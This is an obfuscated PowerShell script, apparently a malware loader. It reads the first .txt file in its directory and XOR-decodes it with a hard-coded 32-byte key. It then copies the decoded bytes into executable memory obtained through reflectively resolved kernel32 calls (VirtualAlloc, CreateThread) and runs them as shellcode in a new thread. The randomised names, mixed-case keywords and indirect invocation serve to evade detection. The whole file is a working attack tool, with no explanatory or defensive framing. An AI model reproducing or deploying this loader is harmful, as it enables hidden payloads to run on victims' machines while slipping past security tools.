


  function xKbkFTkNQxf
  {
    [CmdletBinding(   dEfAULTParamETErSEtNamE   =  'RunLocal', supPORTSshOulDPrOCESS  =  ${TRUe} , CoNfiRMImpAcT =  'High')] Param (
      [Parameter(   PARAmetErsEtname  = 'RunLocal', pOsiTIoN  =   0  )]
      [ValidateNotNullOrEmpty(   )]
      [Byte[]]
      ${f1}
    ) 

    function LoCaL:VRUvUVjZGeDa
    {
      Param
      ( 
        [OutputType( [Type] )]
            
        [Parameter(   poSItIon   =   0 )]
        [Type[]]
        ${f9}  =   (    &( 'New-Object'  ) ( 'Type[]' )(0)),
            
        [Parameter( PosITION  =   1 )]
        [Type]
        ${f10}  = [Void]
       )

      ${37}   =   [AppDomain]::"CURReNTdOMAIN"
      ${36} = .('New-Object') (  'System.Reflection.AssemblyName')('ReflectedDelegate')
      ${35}   =   ${37}."DeFINEDYnAMiCAsSEMBLy"(  ${36}, [System.Reflection.Emit.AssemblyBuilderAccess]::"rUN")
      ${34} = ${35}.( 'DefineDynamicModule' ).Invoke( 'InMemoryModule', ${FAlSE} )
      ${31}  =  ${34}.( 'DefineType'  ).Invoke( 'MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
      ${33} =   ${31}."DeFiNEcOnSTrUctOR"(  'RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::"STAndArD", ${f9} )
      ${33}.('SetImplementationFlags' ).Invoke('Runtime, Managed')
      ${32}  =   ${31}.(  'DefineMethod').Invoke('Invoke', 'Public, HideBySig, NewSlot, Virtual', ${f10}, ${f9})
      ${32}.(  'SetImplementationFlags').Invoke(  'Runtime, Managed')
        
      return ${31}.( 'CreateType').Invoke()
    }

    function LOCAL:jtewnZwQ
    {
      Param
      (  
        [OutputType([IntPtr] )]
        
        [Parameter(  POSItIoN = 0, MAnDAtOry =   ${tRUE} )]
        [String]
        ${f8},
            
        [Parameter( PoSITiON   = 1, mAnDAtoRY  =  ${tRUe} )]
        [String]
        ${f7}
      )

      
      ${30}   =  [AppDomain]::"cuRRENtDOMaIN".( 'GetAssemblies').Invoke(   )  |
      . ('Where-Object'  ) { ${_}."GloBALaSSEmblYcache" -And [IO.Path]::(  'GetFileName'  ).Invoke(${_}."loCATIon" ).( 'Equals' ).Invoke('System.dll' ) }
      ${29}   =  ${30}.(  'GetType' ).Invoke( 'Microsoft.Win32.UnsafeNativeMethods' )
      
      ${28} =  ${29}.( 'GetMethod' ).Invoke( 'GetModuleHandle' )
      ${25}   = ${29}."gETmeThod"( 'GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]));  
      
      ${26} = ${28}."INVoKe"( ${NULL}, @(${f8}  ) )
      ${27} =   . ('New-Object'  ) (  'IntPtr')
      ${24}  =  .  ('New-Object'  ) ('System.Runtime.InteropServices.HandleRef')( ${27}, ${26})
        
      
      return ${25}."iNVOkE"( ${NUll}, @([System.Runtime.InteropServices.HandleRef]${24}, ${f7})  )
    }



    
    function locaL:QNZKTUIt (  [IntPtr] ${f4}, [IntPtr] ${f3}, [Int] ${f6} )
    {
      ${22}   =   ${f6} / 8

      function lOcAl:AVKJJacW (  [IntPtr] ${f5}  )
      {
        [byte[]]${23}  =  &  ('New-Object') ( 'Byte[]' )(0  )
        ${f5}.(  'ToString' ).Invoke( "X$(${22}*2)"  ) -split '([A-F0-9]{2})'   |   .(  'ForEach-Object' ) { if ( ${_}) { ${23} += [Byte] ('0x{0}' -f ${_}) } }
        [System.Array]::( 'Reverse').Invoke(${23}  )
            
        return ${23}
      }
        
      [Byte[]]${19}  =  . ( 'New-Object') ('Byte[]'  )(  0  )
        
      if (${22} -eq 8)
      {
        ${19} += 0x48,0xB8                      
        ${19} +=   &  ('AvKJjaCw'  ) ${f4}       
        ${19} += 0xFF,0xD0                              
        ${19} += 0x6A,0x00                              
        ${19} += 0x48,0xB8                              
        ${19} += &(  'AvKJjaCw' ) ${f3} 
        ${19} += 0xFF,0xD0                              
      }
      else
      {
        ${19} += 0xB8                           
        ${19} +=  &(  'AvKJjaCw'  ) ${f4}       
        ${19} += 0xFF,0xD0                              
        ${19} += 0x6A,0x00                              
        ${19} += 0xB8                                   
        ${19} +=   &  (  'AvKJjaCw' ) ${f3} 
        ${19} += 0xFF,0xD0                              
      }
        
      return ${19}
    }

    function LOCAl:zssCWCFPLEU
    {
      
      ${18}  =   ${16}."iNVokE"(  [IntPtr]::"zeRo", ${f1}."lENgtH" +   1, 0x3000, 0x40 ) 
      if ( !${18} )
      {
        Throw ""
      }

      
      [System.Runtime.InteropServices.Marshal]::(  'Copy'  ).Invoke( ${f1}, 0, ${18}, ${f1}."leNGTH"  )
        
      
      ${f3}  =   &(  'jTEWnzwq' ) 'kernel32.dll' 'ExitThread'
        
      if (${17}  )
      {
        ${19}   =   &( 'QNzkTUit') ${18} ${f3} 32
      }
      else
      {
        ${19} =   &  ('QNzkTUit') ${18} ${f3} 64
      }

      
      ${20}   =  ${16}."INvoKE"([IntPtr]::"zeRo", ${19}."LeNgTH"  +  1, 0x3000, 0x40) 
      if (!${20})
      {
        Throw ""
      }

      
      [System.Runtime.InteropServices.Marshal]::('Copy' ).Invoke(  ${19}, 0, ${20}, ${19}."lEngTh"  )

      
      ${21}   =   ${10}."inVOkE"([IntPtr]::"ZeRO", 0, ${20}, ${18}, 0, [IntPtr]::"ZEro")
      if (  !${21})
      {
        Throw ""
      }

      
      ${7}."invoke"(${21}, 0xFFFFFFFF )  |   .( 'Out-Null')
        
      ${13}."iNVOke"(${20}, ${19}."lENgtH" +  1, 0x8000 ) |  .('Out-Null') 
      ${13}."INVoKE"( ${18}, ${f1}."lENGTH"   + 1, 0x8000)  | & ('Out-Null'  ) 
    }
    if ( [IntPtr]::"SiZe" -eq 4)
    {
      ${17}   =   ${TrUE}
    }
    else
    {
      ${17}   =   ${fALsE}
    }

    
    ${15}   =     &  (  'jTEWnzwq') 'kernel32.dll' 'VirtualAlloc'
    ${14}   =   .(  'vRUVUvjzGEda'  ) @([IntPtr], [UInt32], [UInt32], [UInt32]  ) ( [IntPtr])
    ${16}  =  [System.Runtime.InteropServices.Marshal]::( 'GetDelegateForFunctionPointer').Invoke(${15}, ${14})
    ${12} =    .( 'jTEWnzwq') 'kernel32.dll' 'VirtualFree'
    ${11}  =    . ('vRUVUvjzGEda') @([IntPtr], [Uint32], [UInt32]  ) ([Bool] )
    ${13} = [System.Runtime.InteropServices.Marshal]::(  'GetDelegateForFunctionPointer' ).Invoke(  ${12}, ${11} )
    ${9}   =    &( 'jTEWnzwq') 'kernel32.dll' 'CreateThread'
    ${8}   =    &( 'vRUVUvjzGEda') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (  [IntPtr]  )
    ${10}  =   [System.Runtime.InteropServices.Marshal]::( 'GetDelegateForFunctionPointer'  ).Invoke(${9}, ${8})
    ${6}   =  .( 'jTEWnzwq') 'kernel32.dll' 'WaitForSingleObject'
    ${5}   = & ( 'vRUVUvjzGEda') @([IntPtr], [Int32] ) ( [Int])
    ${7}  = [System.Runtime.InteropServices.Marshal]::('GetDelegateForFunctionPointer'  ).Invoke(${6}, ${5})
                
     &  ('ZsscwcfPleU'  )
  }

  function uMMATfFJRrVX( [Byte[]] ${f2}) {
    [Byte[]] ${4}   =  @(0x8c, 0x58, 0xa5, 0x06, 0x4f, 0x1f, 0x54, 0x63, 0x71, 0x8b, 0xa2, 0xda, 0x23, 0x73, 0xa0, 0x31, 0x10, 0xdf, 0x7f, 0x1d, 0xeb, 0x94, 0x28, 0x62, 0x5e, 0x35, 0x9f, 0x86, 0x6d, 0xfd, 0xaa, 0x75)
    For( ${3}  =  0; ${3} -lt ${f2}."COuNt"  ; ${3}++ ) {
      ${1}  =  ${f2}[${3}]
      ${2} =  ${4}[${3} % 32]
      ${f2}[${3}]   =  (( ${1} -band -bnot ${2}  ) -bor (${2} -band -bnot ${1}  )  )
    }
  }

  ${f1}  =  [IO.File]::(  'ReadAllBytes'  ).Invoke(  @(.(  'Get-ChildItem' ) '*.txt')[0]."nAME")
  . (  'uMMatfFjrrVX') ${f1}

    &  ( 'xkbKFTKnqxf') ${f1}

  


